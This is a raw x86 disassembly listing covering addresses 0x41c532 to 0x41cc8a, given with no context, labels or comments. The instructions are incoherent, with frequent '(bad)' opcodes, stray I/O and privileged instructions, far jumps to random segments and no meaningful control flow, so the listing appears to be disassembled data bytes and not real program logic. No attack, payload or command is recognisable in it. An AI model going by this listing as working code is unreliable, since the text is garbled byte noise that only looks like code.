  41c532:	jb     0x41c4fa
  41c534:	loop   0x41c512
  41c536:	ins    DWORD PTR es:[edi],dx
  41c537:	and    BYTE PTR [eax-0x26ae1a4e],0x7f
  41c53e:	repz int3 
  41c540:	add    eax,DWORD PTR [ebx+edx*1-0x728c8012]
  41c547:	jmp    esp
  41c549:	adc    ebx,esp
  41c54b:	call   0xef30:0x6501cee3
  41c552:	sub    BYTE PTR [ebp+0x58],cl
  41c555:	push   cs
  41c556:	int    0x3d
  41c558:	(bad)  
  41c559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c55a:	mov    ds:0x4cf4ab72,eax
  41c55f:	sub    DWORD PTR [edi-0x3a38f007],ebp
  41c565:	fnstsw WORD PTR [esp+ecx*4-0x5]
  41c569:	leave  
  41c56a:	aad    0x4d
  41c56c:	lds    esp,FWORD PTR [ebx+0x50009b43]
  41c572:	mov    dl,0x21
  41c574:	cs jp  0x41c52e
  41c577:	mov    gs,WORD PTR [edx+0x1]
  41c57a:	mov    ah,bh
  41c57c:	push   ebp
  41c57d:	xor    BYTE PTR [ebp-0x1b],cl
  41c580:	pop    edx
  41c581:	add    eax,0xf02be5dc
  41c586:	jnp    0x41c58f
  41c588:	out    dx,eax
  41c589:	cli    
  41c58a:	jo     0x41c559
  41c58c:	fstp   TBYTE PTR [eax]
  41c58e:	arpl   WORD PTR [edx],ax
  41c590:	push   edi
  41c591:	dec    esp
  41c592:	jl     0x41c60d
  41c594:	mov    ds:0x38892e3d,al
  41c599:	push   edx
  41c59a:	imul   esi,DWORD PTR [ebp-0x1d],0xffffffc7
  41c59e:	mov    eax,0x83a0de8c
  41c5a3:	outs   dx,DWORD PTR ds:[esi]
  41c5a4:	std    
  41c5a5:	(bad)  
  41c5a7:	dec    ebp
  41c5a8:	jl     0x41c58f
  41c5aa:	pop    ds
  41c5ab:	jge    0x41c627
  41c5ad:	mov    fs,WORD PTR [edx+edx*1]
  41c5b0:	inc    ebp
  41c5b1:	xor    DWORD PTR [eax-0x18b51364],ebp
  41c5b7:	(bad)  
  41c5b9:	mov    ebp,0xf8dacb52
  41c5be:	inc    ebp
  41c5bf:	push   ebx
  41c5c0:	sbb    BYTE PTR [edx],bl
  41c5c2:	jmp    0x41c5f6
  41c5c4:	call   0x99c1:0x5ad5fb17
  41c5cb:	cwde   
  41c5cc:	inc    edi
  41c5cd:	mov    BYTE PTR [edx+0x10],bh
  41c5d0:	sub    BYTE PTR [ecx+0x7d],al
  41c5d3:	mov    dl,0xd6
  41c5d5:	jmp    0x5dabd64c
  41c5da:	mov    bh,BYTE PTR [ebx]
  41c5dc:	mov    ds:0xe5e858bc,eax
  41c5e1:	fnstsw ax
  41c5e3:	jle    0x41c597
  41c5e5:	test   BYTE PTR [eax-0xc6bf47],0x8c
  41c5ec:	loopne 0x41c63a
  41c5ee:	mov    al,0x3c
  41c5f0:	xor    ebp,DWORD PTR [ebx-0x23]
  41c5f3:	ins    BYTE PTR es:[edi],dx
  41c5f4:	mov    edi,0xe1abf77d
  41c5f9:	mov    BYTE PTR [esi],al
  41c5fb:	and    DWORD PTR [edi+esi*1],esi
  41c5fe:	fcom   QWORD PTR [edi]
  41c600:	xchg   esp,eax
  41c601:	(bad)  
  41c602:	mov    dl,0x22
  41c604:	dec    ecx
  41c605:	adc    al,0x68
  41c607:	je     0x41c669
  41c609:	and    eax,0x4439d08b
  41c60e:	lods   eax,DWORD PTR ds:[esi]
  41c60f:	sbb    al,0x1d
  41c611:	sbb    DWORD PTR [eax+0x36],esi
  41c614:	sub    eax,0x2dca57c
  41c619:	loopne 0x41c680
  41c61b:	xlat   BYTE PTR ds:[ebx]
  41c61c:	fisubr DWORD PTR [eax-0x72fa62c]
  41c622:	sbb    DWORD PTR [edx-0xc],0xffffff9c
  41c626:	stc    
  41c627:	shl    BYTE PTR [ebp+0x5d945f81],1
  41c62d:	or     BYTE PTR [ebx+0x13943c75],0x47
  41c634:	dec    esi
  41c635:	add    DWORD PTR [eax],eax
  41c637:	push   ebx
  41c638:	mov    ds:0x45f2035,al
  41c63d:	push   edx
  41c63e:	push   ss
  41c63f:	xor    BYTE PTR [ebp+eiz*4+0x424827ea],dh
  41c646:	test   eax,0xbda04927
  41c64b:	adc    DWORD PTR [esi+0x4f],0x81a819fd
  41c652:	int3   
  41c653:	icebp  
  41c654:	dec    edx
  41c655:	nop
  41c656:	adc    al,0x5f
  41c658:	adc    eax,0xe50cdea2
  41c65d:	dec    ebx
  41c65e:	pop    ebp
  41c65f:	inc    ebx
  41c660:	or     al,0x1e
  41c662:	pop    ecx
  41c663:	fisub  DWORD PTR [ecx+0x1f]
  41c666:	arpl   WORD PTR [edx-0x53acebb3],bx
  41c66c:	cwde   
  41c66d:	or     al,0x9d
  41c66f:	lods   eax,DWORD PTR ds:[esi]
  41c670:	aam    0x6c
  41c672:	sar    DWORD PTR [edi-0x72f695d4],cl
  41c678:	lods   eax,DWORD PTR ds:[esi]
  41c679:	stc    
  41c67a:	jl     0x41c6cb
  41c67c:	cmp    DWORD PTR [edx],edi
  41c67e:	sub    eax,DWORD PTR [eax-0x63]
  41c681:	lock or dl,cl
  41c684:	pop    eax
  41c685:	daa    
  41c686:	pop    ebx
  41c687:	xchg   edi,eax
  41c688:	nop
  41c689:	test   DWORD PTR [edx+eiz*4],esi
  41c68c:	aad    0x3f
  41c68e:	add    ch,al
  41c690:	stos   BYTE PTR es:[edi],al
  41c691:	inc    edi
  41c692:	push   esp
  41c693:	mov    ecx,0x48a00898
  41c698:	mov    DWORD PTR [edi],ebp
  41c69a:	(bad)  
  41c69b:	rcr    BYTE PTR ds:0x9443812e,0x3
  41c6a2:	xchg   ecx,eax
  41c6a3:	or     al,0xff
  41c6a5:	shl    DWORD PTR [ebx],1
  41c6a7:	not    ebx
  41c6a9:	fild   DWORD PTR [ebx-0x2c]
  41c6ac:	and    al,bl
  41c6ae:	push   ds
  41c6af:	xor    edx,DWORD PTR [ecx-0x38]
  41c6b2:	fisubr DWORD PTR [edi+0x22732cf]
  41c6b8:	push   ss
  41c6b9:	cwde   
  41c6ba:	xor    BYTE PTR [ebx-0xf],bh
  41c6bd:	xor    BYTE PTR [ecx+0x2f],ah
  41c6c0:	clc    
  41c6c1:	cdq    
  41c6c2:	repz push eax
  41c6c4:	and    eax,0x7077f6a5
  41c6c9:	sar    BYTE PTR [edx],1
  41c6cb:	add    al,0x76
  41c6cd:	loope  0x41c6d0
  41c6cf:	pop    esp
  41c6d0:	jmp    0x41c6f7
  41c6d2:	popa   
  41c6d3:	ss test al,0xa6
  41c6d6:	(bad)  
  41c6d8:	(bad)  
  41c6d9:	dec    esi
  41c6da:	pop    ebp
  41c6db:	push   ds
  41c6dc:	shl    BYTE PTR [ebx],cl
  41c6de:	jmp    0x41c6d5
  41c6e0:	pop    edi
  41c6e1:	fist   WORD PTR [ebx]
  41c6e3:	xchg   edx,eax
  41c6e4:	ins    BYTE PTR es:[edi],dx
  41c6e5:	jg     0x41c692
  41c6e7:	(bad)  
  41c6e8:	sub    ah,dl
  41c6ea:	pop    esp
  41c6eb:	(bad)  
  41c6ec:	pop    esi
  41c6ed:	cdq    
  41c6ee:	jmp    FWORD PTR [ebp+0xf112b6a]
  41c6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6f5:	push   eax
  41c6f6:	lahf   
  41c6f7:	mov    ds:0xfc77dad9,eax
  41c6fc:	imul   edx,DWORD PTR [ebx],0xffffffba
  41c6ff:	test   bh,bl
  41c701:	call   0xb8729690
  41c706:	gs adc al,0x4c
  41c709:	enter  0x75d9,0xd6
  41c70d:	neg    bl
  41c70f:	mov    ah,BYTE PTR [ecx-0x41]
  41c712:	jl     0x41c694
  41c714:	xor    al,0x93
  41c716:	push   edi
  41c717:	push   ds
  41c718:	in     eax,dx
  41c719:	and    eax,0xbdb1232b
  41c71e:	and    al,0x53
  41c720:	outs   dx,DWORD PTR ds:[esi]
  41c721:	aad    0x8c
  41c723:	lock into 
  41c725:	sahf   
  41c726:	test   DWORD PTR [edi-0x4fa1582c],0xff90a22e
  41c730:	add    cl,bl
  41c732:	mov    WORD PTR [ecx+0x36],?
  41c735:	adc    al,0xaa
  41c737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c738:	lock mov bh,0xe9
  41c73b:	call   0xc4cf:0x4b8ecfd1
  41c742:	sub    DWORD PTR ds:0x8fb8a94e,esi
  41c748:	push   edi
  41c749:	or     dl,dh
  41c74b:	mov    ebp,0x45412789
  41c750:	mov    ?,WORD PTR [edi-0x6b54953c]
  41c756:	mov    dl,0xaf
  41c758:	xchg   ecx,eax
  41c759:	sub    DWORD PTR ds:0xd08a196f,ebx
  41c75f:	mov    WORD PTR [edx+0x24],es
  41c762:	cmc    
  41c763:	arpl   WORD PTR [esi+0x42],di
  41c766:	fs xchg ebx,eax
  41c768:	sub    al,0xf4
  41c76a:	js     0x41c7a6
  41c76c:	cli    
  41c76d:	stos   DWORD PTR es:[edi],eax
  41c76e:	dec    dx
  41c770:	dec    ebx
  41c771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c772:	je     0x41c718
  41c774:	dec    ebp
  41c775:	aam    0xb0
  41c777:	ins    BYTE PTR es:[edi],dx
  41c778:	call   0xe124:0x528f84d6
  41c77f:	inc    esp
  41c780:	(bad)  [ecx+0x13]
  41c783:	sub    bh,dl
  41c785:	ret    
  41c786:	retf   
  41c787:	mov    edx,0x8256060d
  41c78c:	or     DWORD PTR [eax],edi
  41c78e:	mov    esi,0x84150c7b
  41c793:	sub    eax,0x5be1ed91
  41c798:	inc    ecx
  41c799:	ret    0xe4fc
  41c79c:	popa   
  41c79d:	mov    ds:0x38edf61,eax
  41c7a2:	add    cl,BYTE PTR [eax-0x45]
  41c7a5:	mov    esi,0xb17a287
  41c7aa:	sub    DWORD PTR [eax-0x1a0ec5b],edi
  41c7b0:	leave  
  41c7b1:	int3   
  41c7b2:	xor    DWORD PTR [ebx-0x5230b7eb],edx
  41c7b8:	aam    0x9f
  41c7ba:	push   0xffffffc7
  41c7bc:	push   ebp
  41c7bd:	test   al,0xdb
  41c7bf:	test   BYTE PTR [edi-0x2a],ah
  41c7c2:	fs callw 0xdcca
  41c7c7:	jl     0x41c761
  41c7c9:	xchg   ebp,eax
  41c7ca:	pop    ebp
  41c7cb:	sub    BYTE PTR [ebx-0x72],ch
  41c7ce:	mov    esp,0x5714c2ec
  41c7d3:	sbb    ah,cl
  41c7d5:	lahf   
  41c7d6:	lea    ebx,[eax+eiz*2-0x6a]
  41c7da:	sti    
  41c7db:	cmp    ebx,esp
  41c7dd:	neg    BYTE PTR [esi+0x26]
  41c7e0:	jns    0x41c7b3
  41c7e2:	fmul   QWORD PTR [edi+edx*8-0x5c]
  41c7e6:	xor    BYTE PTR [eax+0x42],bl
  41c7e9:	(bad)  
  41c7ea:	fst    QWORD PTR [eax-0x327bb5ea]
  41c7f0:	icebp  
  41c7f1:	jmp    0xfa3d:0xf5eda220
  41c7f8:	xchg   DWORD PTR [eax-0x6],ebx
  41c7fb:	das    
  41c7fc:	cwde   
  41c7fd:	je     0x41c860
  41c7ff:	push   ebx
  41c800:	dec    esi
  41c801:	and    eax,0x1dd817fb
  41c806:	arpl   WORD PTR [esi],di
  41c808:	mov    bl,0xbc
  41c80a:	xor    al,0xf7
  41c80c:	pop    ss
  41c80d:	outs   dx,DWORD PTR ds:[esi]
  41c80e:	add    eax,0x7835be78
  41c813:	pop    ebp
  41c814:	retf   0xf461
  41c817:	ror    DWORD PTR [ebx],1
  41c819:	call   0xbb42:0xe84e60ea
  41c820:	pushf  
  41c821:	and    edi,edx
  41c823:	imul   ebp,DWORD PTR [edi+0x3a],0xa889a2b5
  41c82a:	into   
  41c82b:	xor    edx,DWORD PTR [esi]
  41c82d:	int3   
  41c82e:	push   ebx
  41c82f:	push   0xedb2b6de
  41c834:	out    dx,al
  41c835:	(bad)  
  41c836:	pop    ebp
  41c837:	pop    es
  41c838:	(bad)
  41c83c:	ja     0x41c7d3
  41c83e:	jns    0x41c7f6
  41c840:	inc    esp
  41c841:	or     al,0x74
  41c843:	sub    DWORD PTR ds:0x10c107c8,ebp
  41c849:	mov    al,0x40
  41c84b:	ret    0x3205
  41c84e:	loopne 0x41c86f
  41c850:	idiv   BYTE PTR [ecx]
  41c852:	sbb    DWORD PTR [esi],esp
  41c854:	shl    BYTE PTR [esi-0x4e549ca5],cl
  41c85a:	xor    eax,0xc814d62d
  41c85f:	scas   al,BYTE PTR es:[edi]
  41c860:	out    dx,al
  41c861:	adc    al,0x1c
  41c863:	xor    BYTE PTR [edx-0x4baba4fb],cl
  41c869:	adc    DWORD PTR [ebp-0x5642196b],ebx
  41c86f:	retf   
  41c870:	fcom   DWORD PTR [eax]
  41c872:	pop    esp
  41c873:	cwde   
  41c874:	pop    eax
  41c875:	mov    dh,0xa0
  41c877:	idiv   DWORD PTR [ecx]
  41c879:	or     BYTE PTR [edi],ah
  41c87b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c87c:	cdq    
  41c87d:	adc    ch,dl
  41c87f:	fstp   st(6)
  41c881:	fs push esi
  41c883:	pop    ss
  41c884:	test   DWORD PTR [edi],eax
  41c886:	out    0x46,eax
  41c888:	loop   0x41c8bc
  41c88a:	jne    0x41c88c
  41c88c:	mov    cl,0x99
  41c88e:	jmp    0xe777975f
  41c893:	out    0xa7,eax
  41c895:	adc    al,0x7b
  41c897:	add    dl,BYTE PTR [ecx-0x27a4d854]
  41c89d:	pusha  
  41c89e:	bound  ebp,QWORD PTR [edx+0x48]
  41c8a1:	ret    
  41c8a2:	nop
  41c8a3:	sub    eax,0x2d1fd8b7
  41c8a8:	adc    eax,0x37064e2e
  41c8ad:	or     ch,BYTE PTR [eax+ebp*4]
  41c8b0:	fs mov ah,0x28
  41c8b3:	(bad)  
  41c8b4:	fwait
  41c8b5:	push   eax
  41c8b6:	and    BYTE PTR [edx+ebx*8],ch
  41c8b9:	js     0x41c92b
  41c8bb:	out    0xb6,al
  41c8bd:	mov    ds:0x1aeded8f,al
  41c8c2:	fiadd  DWORD PTR [eax-0x2fd6c4f7]
  41c8c8:	dec    ebx
  41c8c9:	push   edi
  41c8ca:	pop    ss
  41c8cb:	push   ecx
  41c8cc:	fistp  DWORD PTR [esi-0x36]
  41c8cf:	jne    0x41c8e4
  41c8d1:	(bad)  
  41c8d2:	(bad)  
  41c8d3:	dec    esi
  41c8d4:	push   edi
  41c8d5:	retf   
  41c8d6:	sub    eax,0xa21270ad
  41c8db:	jle    0x41c8cd
  41c8dd:	inc    edi
  41c8de:	lods   eax,DWORD PTR ds:[esi]
  41c8df:	inc    edx
  41c8e0:	fcmovnb st,st(2)
  41c8e2:	pop    esp
  41c8e3:	sub    al,BYTE PTR [edx+esi*2]
  41c8e6:	dec    ecx
  41c8e7:	push   ecx
  41c8e8:	ds adc ebx,edi
  41c8eb:	xchg   esp,eax
  41c8ec:	mov    ds:0x471744c8,eax
  41c8f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8f2:	out    0x4c,al
  41c8f4:	mov    edi,0x58e8f4d5
  41c8f9:	jb     0x41c8fa
  41c8fb:	stc    
  41c8fc:	jmp    0xb1cb:0x57956c8d
  41c903:	imul   esi,DWORD PTR [eax-0x26],0x11
  41c907:	test   DWORD PTR [esi],edi
  41c909:	loop   0x41c915
  41c90b:	push   es
  41c90c:	add    ah,BYTE PTR [eax-0x63]
  41c90f:	jmp    0xd053b69a
  41c914:	arpl   WORD PTR [eax+0x709a5c02],ax
  41c91a:	adc    al,0xfd
  41c91c:	pop    edi
  41c91d:	icebp  
  41c91e:	icebp  
  41c91f:	leave  
  41c920:	jno    0x41c8bf
  41c922:	addr16 add bh,cl
  41c925:	sbb    DWORD PTR [ecx-0x110dbb3d],0xac2f7ef1
  41c92f:	and    BYTE PTR [edx-0x14],cl
  41c932:	test   al,0xa9
  41c934:	and    al,0x88
  41c936:	sahf   
  41c937:	push   ebx
  41c938:	(bad)  
  41c939:	rcl    DWORD PTR [esi],1
  41c93b:	shl    BYTE PTR [ecx+0x23],cl
  41c93e:	mov    ecx,0xdf19c9cc
  41c943:	jl     0x41c8fc
  41c945:	les    eax,FWORD PTR [esi+0x1a]
  41c948:	fisttp WORD PTR [esi-0xc00c414]
  41c94e:	add    DWORD PTR [edx-0x10bafb35],0x3d
  41c955:	(bad)  
  41c956:	iret   
  41c957:	add    BYTE PTR [ebx],al
  41c959:	in     al,0x5d
  41c95b:	mov    eax,0xa0156a64
  41c960:	xor    DWORD PTR [ebx+ecx*2+0x1b2ba9e0],esp
  41c967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c968:	ins    BYTE PTR es:[edi],dx
  41c969:	pop    edx
  41c96a:	sub    eax,0x21f677d3
  41c96f:	fsub   DWORD PTR [edi]
  41c971:	xchg   ebx,eax
  41c972:	xchg   BYTE PTR [edx],cl
  41c974:	pop    ebp
  41c975:	or     bh,BYTE PTR [ebp-0x1ab9f395]
  41c97b:	cwde   
  41c97c:	cmp    BYTE PTR [ebp-0xbfb662d],ch
  41c982:	or     eax,0x1f94f33b
  41c987:	fwait
  41c988:	cmp    dl,ah
  41c98a:	pop    esp
  41c98b:	or     al,0x63
  41c98d:	mov    bl,0x64
  41c98f:	push   ebx
  41c990:	imul   ebx,DWORD PTR [edi],0xffffffcd
  41c993:	mov    dl,0xf3
  41c995:	outs   dx,BYTE PTR ds:[esi]
  41c996:	cmp    BYTE PTR [edx],bl
  41c998:	push   eax
  41c999:	jb     0x41c989
  41c99b:	dec    ebp
  41c99c:	fidivr WORD PTR [edx]
  41c99e:	jl     0x41c954
  41c9a0:	ja     0x41c9a0
  41c9a2:	jo     0x41ca02
  41c9a4:	or     BYTE PTR [esi],cl
  41c9a6:	sub    eax,0xe0ec89de
  41c9ab:	ret    
  41c9ac:	dec    ecx
  41c9ad:	jmp    0x41c9dd
  41c9af:	inc    edi
  41c9b0:	xor    edi,edi
  41c9b2:	fs dec ebp
  41c9b4:	addr16 push esp
  41c9b6:	pop    ecx
  41c9b7:	out    0xff,al
  41c9b9:	inc    esi
  41c9ba:	push   0x46c19f30
  41c9bf:	ret    0xd48
  41c9c2:	cmc    
  41c9c3:	pop    es
  41c9c4:	cs jle 0x41c99c
  41c9c7:	ror    ebp,cl
  41c9c9:	push   0x9193bc35
  41c9ce:	ins    BYTE PTR es:[edi],dx
  41c9cf:	ret    
  41c9d0:	mov    ah,0x47
  41c9d2:	fstp   DWORD PTR [ecx]
  41c9d4:	mov    edi,0xe115aac4
  41c9d9:	retf   
  41c9da:	and    bh,cl
  41c9dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9dd:	xor    DWORD PTR [ebx+0x31],ebx
  41c9e0:	inc    ecx
  41c9e1:	add    eax,0xdd589580
  41c9e6:	stc    
  41c9e7:	es arpl cx,bx
  41c9ea:	std    
  41c9eb:	jmp    0x406a:0xb6203c4e
  41c9f2:	out    0x40,al
  41c9f4:	dec    ebp
  41c9f5:	cmp    ebp,DWORD PTR [edx-0x1edab123]
  41c9fb:	cwde   
  41c9fc:	pop    ds
  41c9fd:	mov    edx,0x25fcfc78
  41ca02:	xchg   edx,eax
  41ca03:	test   eax,0xbbd64db8
  41ca08:	hlt    
  41ca09:	add    eax,0xb0d68126
  41ca0e:	or     eax,0x386e059
  41ca13:	fadd   st,st(2)
  41ca15:	call   0x7262d113
  41ca1a:	mov    WORD PTR [ecx+0x26da48dd],ss
  41ca20:	mov    ds:0xb52abcce,al
  41ca25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca26:	xchg   esi,eax
  41ca27:	ins    BYTE PTR es:[edi],dx
  41ca28:	or     ah,0x82
  41ca2b:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41ca2d:	ja     0x41ca71
  41ca2f:	or     BYTE PTR [esi+0x544f3808],ch
  41ca35:	add    BYTE PTR [edx-0x55],al
  41ca38:	xor    BYTE PTR [eax+0x46],al
  41ca3b:	rol    BYTE PTR [ebx+ecx*2],cl
  41ca3e:	inc    ecx
  41ca3f:	nop
  41ca40:	mov    edx,0x3d0391dd
  41ca45:	in     eax,dx
  41ca46:	aaa    
  41ca47:	inc    esp
  41ca48:	fcomp  QWORD PTR [ebp+0x3f]
  41ca4b:	clc    
  41ca4c:	hlt    
  41ca4d:	sbb    DWORD PTR [ebp-0x2f5b0faa],esi
  41ca53:	mov    ebp,0x719128e1
  41ca58:	lods   eax,DWORD PTR ds:[esi]
  41ca59:	test   BYTE PTR [edx-0x3d],0xc6
  41ca5d:	(bad)  
  41ca5e:	xchg   esi,eax
  41ca5f:	cmp    DWORD PTR [edi+0x1e],edi
  41ca62:	cdq    
  41ca63:	dec    edi
  41ca64:	int    0xce
  41ca66:	jno    0x41cae0
  41ca68:	ins    BYTE PTR es:[edi],dx
  41ca69:	push   es
  41ca6a:	fs pop ebp
  41ca6c:	sub    ah,BYTE PTR [ecx]
  41ca6e:	(bad)
  41ca71:	adc    al,0xa1
  41ca73:	adc    bh,BYTE PTR [ebx-0x72]
  41ca76:	shr    BYTE PTR ds:0x939a9af0,cl
  41ca7c:	dec    edi
  41ca7d:	lods   eax,DWORD PTR ds:[esi]
  41ca7e:	cli    
  41ca7f:	jle    0x41cacb
  41ca81:	pop    eax
  41ca82:	aam    0x71
  41ca84:	mov    bl,cl
  41ca86:	fst    QWORD PTR [ebx+ebp*8-0x19]
  41ca8a:	sbb    DWORD PTR [ecx+edx*1-0x1e],edi
  41ca8e:	neg    BYTE PTR ds:0x46f3fe03
  41ca94:	xor    DWORD PTR [ecx-0x14],eax
  41ca97:	xchg   ebp,eax
  41ca98:	and    eax,0x847f33a9
  41ca9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca9e:	inc    esp
  41ca9f:	in     eax,dx
  41caa0:	iret   
  41caa1:	inc    eax
  41caa2:	dec    esi
  41caa3:	or     DWORD PTR [edi],eax
  41caa5:	lods   eax,DWORD PTR ds:[esi]
  41caa6:	mov    dl,0xc4
  41caa8:	inc    ebp
  41caa9:	cmp    dh,bl
  41caab:	test   DWORD PTR [ebx-0x38],edi
  41caae:	gs jmp 0xa47811cd
  41cab4:	ret    0xcf07
  41cab7:	test   al,0xd5
  41cab9:	xor    dl,bh
  41cabb:	leave  
  41cabc:	mov    edi,0xe64eaf24
  41cac1:	xor    ebp,esi
  41cac3:	sub    BYTE PTR [edx],dh
  41cac5:	mov    edx,0xc6b3d9f6
  41caca:	inc    edi
  41cacb:	(bad)  
  41cacd:	outs   dx,BYTE PTR ds:[esi]
  41cace:	test   BYTE PTR [edx-0x6eaa2ecd],dl
  41cad4:	xor    DWORD PTR [edx],ecx
  41cad6:	jmp    0x4614de9b
  41cadb:	pop    ds
  41cadc:	push   edi
  41cadd:	mov    al,ds:0xcde10297
  41cae2:	test   DWORD PTR [edi],esi
  41cae4:	test   al,0xc4
  41cae6:	mov    dh,0x68
  41cae8:	mov    DWORD PTR [edi],ebp
  41caea:	data16 sub BYTE PTR [ebx+0x6a],bl
  41caee:	dec    edx
  41caef:	arpl   WORD PTR [edi-0x48d1734d],di
  41caf5:	jb     0x41caf6
  41caf7:	mov    BYTE PTR [eax],dh
  41caf9:	(bad)  
  41cafb:	stc    
  41cafc:	shl    esp,cl
  41cafe:	shr    BYTE PTR [ecx*1+0x438df137],1
  41cb05:	loop   0x41cb08
  41cb07:	dec    ebp
  41cb08:	mov    dl,0x4b
  41cb0a:	aad    0x67
  41cb0c:	sbb    dh,BYTE PTR [ebx]
  41cb0e:	dec    edx
  41cb0f:	shr    DWORD PTR [ebx+0x12a63f61],1
  41cb15:	add    esi,ebx
  41cb17:	xor    eax,0xd7a38cd5
  41cb1c:	inc    ebp
  41cb1d:	fisttp QWORD PTR [esi-0x2e]
  41cb20:	jbe    0x41cacb
  41cb22:	shl    BYTE PTR [ebp-0x590c0831],1
  41cb28:	xor    BYTE PTR [esi+esi*8+0x11],ch
  41cb2c:	jno    0x41cb38
  41cb2e:	jmp    0xee4c:0xbac6717d
  41cb35:	cli    
  41cb36:	(bad)  
  41cb37:	bound  ecx,QWORD PTR [ebx+0x74e4ce3b]
  41cb3d:	int3   
  41cb3e:	fimul  DWORD PTR [ebp+0x9]
  41cb41:	test   al,0x91
  41cb43:	push   edi
  41cb44:	adc    cl,BYTE PTR [edi-0xac500e9]
  41cb4a:	sahf   
  41cb4b:	test   DWORD PTR [edi+0x5af4b891],0xa7c2bb15
  41cb55:	rcr    dl,cl
  41cb57:	dec    esi
  41cb58:	jl     0x41cbcd
  41cb5a:	sub    al,0x88
  41cb5c:	inc    esp
  41cb5d:	stos   BYTE PTR es:[edi],al
  41cb5e:	call   0xf273:0x2f73b19f
  41cb65:	out    0x8b,al
  41cb67:	ins    BYTE PTR es:[edi],dx
  41cb68:	jge    0x41cba7
  41cb6a:	lock dec ebx
  41cb6c:	shl    BYTE PTR [ebx+0x66],cl
  41cb6f:	push   eax
  41cb70:	aad    0x5f
  41cb72:	aaa    
  41cb73:	fisttp WORD PTR [ebp+0x1]
  41cb76:	mov    BYTE PTR ds:0x2cb16078,al
  41cb7c:	push   0xd
  41cb7e:	jns    0x41cb62
  41cb80:	ret    0x6deb
  41cb83:	repz xchg edi,edx
  41cb86:	or     al,0x23
  41cb88:	imul   edi,DWORD PTR [edi],0x5b
  41cb8b:	mov    al,ds:0x24e92997
  41cb90:	mov    ecx,0x3ba0d1f
  41cb95:	sub    ecx,DWORD PTR [eax+0x2b3ac494]
  41cb9b:	lods   al,BYTE PTR ds:[esi]
  41cb9c:	xor    bl,BYTE PTR [edi+0xf]
  41cb9f:	mov    ebx,0x6f59645a
  41cba4:	gs test al,0x53
  41cba7:	xchg   ecx,eax
  41cba8:	adc    al,0x4d
  41cbaa:	dec    esi
  41cbab:	mov    dl,0xd3
  41cbad:	add    ah,ch
  41cbaf:	jo     0x41cbe2
  41cbb1:	cli    
  41cbb2:	das    
  41cbb3:	int3   
  41cbb4:	popa   
  41cbb5:	xlat   BYTE PTR ds:[ebx]
  41cbb6:	push   eax
  41cbb7:	xchg   esp,eax
  41cbb8:	scas   eax,DWORD PTR es:[edi]
  41cbb9:	les    ecx,FWORD PTR es:[eax-0x4a1e90ac]
  41cbc0:	outs   dx,BYTE PTR ds:[esi]
  41cbc1:	jge    0x41cbcd
  41cbc3:	cld    
  41cbc4:	push   ds
  41cbc5:	adc    cl,BYTE PTR [edi+0x28b6a7da]
  41cbcb:	push   eax
  41cbcc:	or     ebp,DWORD PTR [esi-0x38]
  41cbcf:	cmp    eax,eax
  41cbd1:	in     al,0x2c
  41cbd3:	dec    eax
  41cbd4:	jmp    0x41cb62
  41cbd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbd7:	add    al,BYTE PTR [esi]
  41cbd9:	pop    ebx
  41cbda:	sub    al,0x30
  41cbdd:	cmp    DWORD PTR [edx+0x4a70197b],ebx
  41cbe3:	dec    ebx
  41cbe4:	test   DWORD PTR [esi+0x26d013a4],esi
  41cbea:	dec    esp
  41cbeb:	aam    0x58
  41cbed:	sub    BYTE PTR ss:[ecx],0x4b
  41cbf1:	inc    esp
  41cbf2:	stos   BYTE PTR es:[edi],al
  41cbf3:	jle    0x41cc33
  41cbf5:	sbb    ebp,DWORD PTR [edx-0x46]
  41cbf8:	ss retf 
  41cbfa:	js     0x41cc59
  41cbfc:	fcomp  QWORD PTR [esi]
  41cbfe:	pop    ebx
  41cbff:	test   cl,bh
  41cc01:	rcr    ecx,1
  41cc03:	inc    ebx
  41cc04:	sbb    eax,0xf4556363
  41cc09:	aad    0x3e
  41cc0b:	aas    
  41cc0c:	push   edx
  41cc0d:	es and eax,0x9a9d2cbf
  41cc13:	adc    DWORD PTR [esi-0x32],0x5e
  41cc17:	test   DWORD PTR [edx+0x7279838d],0xe9386a3f
  41cc21:	sbb    DWORD PTR [edx],eax
  41cc23:	leave  
  41cc24:	pop    ecx
  41cc25:	xchg   BYTE PTR [esi-0xdaf7e99],dh
  41cc2b:	je     0x41cc5b
  41cc2d:	xor    edi,DWORD PTR [edi+0x29]
  41cc30:	popf   
  41cc31:	mul    bh
  41cc33:	retf   
  41cc34:	addr16 jmp 0x1513a26d
  41cc3a:	in     al,0xd0
  41cc3c:	xchg   ecx,eax
  41cc3d:	out    dx,eax
  41cc3e:	cmc    
  41cc3f:	enter  0xaff9,0x99
  41cc43:	inc    eax
  41cc44:	xor    edx,DWORD PTR [esi]
  41cc46:	loop   0x41cc62
  41cc48:	sti    
  41cc49:	ins    DWORD PTR es:[edi],dx
  41cc4a:	das    
  41cc4b:	loopne 0x41cc58
  41cc4d:	mov    esp,0x8bd4efec
  41cc52:	int3   
  41cc53:	call   0x81f9278d
  41cc58:	sub    al,0x75
  41cc5a:	arpl   WORD PTR [eax-0x3a],cx
  41cc5d:	hlt    
  41cc5e:	arpl   WORD PTR [ebx+0x3eb6106b],bp
  41cc64:	icebp  
  41cc65:	fst    st(7)
  41cc67:	adc    esp,ebp
  41cc69:	push   ecx
  41cc6a:	pop    ebp
  41cc6b:	adc    dl,BYTE PTR [ecx-0xa]
  41cc6e:	gs imul ebp,ebx,0xb94e3440
  41cc75:	sbb    esi,DWORD PTR [esi]
  41cc77:	(bad)  
  41cc78:	loope  0x41cc86
  41cc7a:	les    ebx,FWORD PTR [edi+ecx*2+0x30]
  41cc7e:	jp     0x41cc6b
  41cc80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc81:	and    DWORD PTR [edi-0x62a6cea8],ecx
  41cc87:	addr16 jl 0x41cc8f
  41cc8a:	cmc    
